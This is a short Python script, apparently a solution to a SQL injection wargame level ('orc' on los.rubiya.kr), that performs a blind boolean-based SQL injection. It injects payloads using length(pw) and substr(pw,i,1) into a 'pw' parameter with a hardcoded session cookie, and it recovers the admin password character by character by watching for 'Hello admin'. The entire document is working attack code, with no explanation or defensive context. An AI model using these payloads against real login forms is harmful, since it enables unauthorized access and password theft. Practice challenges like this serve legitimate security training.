import requests
import string

pw = ""
a = string.printable
a = a[:-38]
base_url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies = {'PHPSESSID': 'l7blh4j0ivuvo9703rdnkfea5k'}
pw_length = 0

for i in range(10):
    res = requests.get(base_url, params={
        'pw': f"1' or length(pw)={i}#"}, cookies=cookies).text
    if "Hello admin" in res:
        print("length: " + str(i))
        pw_length = i
        break

for i in range(1, pw_length + 1):
    for j in a:
        res = requests.get(base_url, params={
            'pw': f"1' or substr(pw,{i},1)='{j}'#"
        }, cookies=cookies).text
        if "Hello admin" in res:
            pw += j
            break
print(pw)
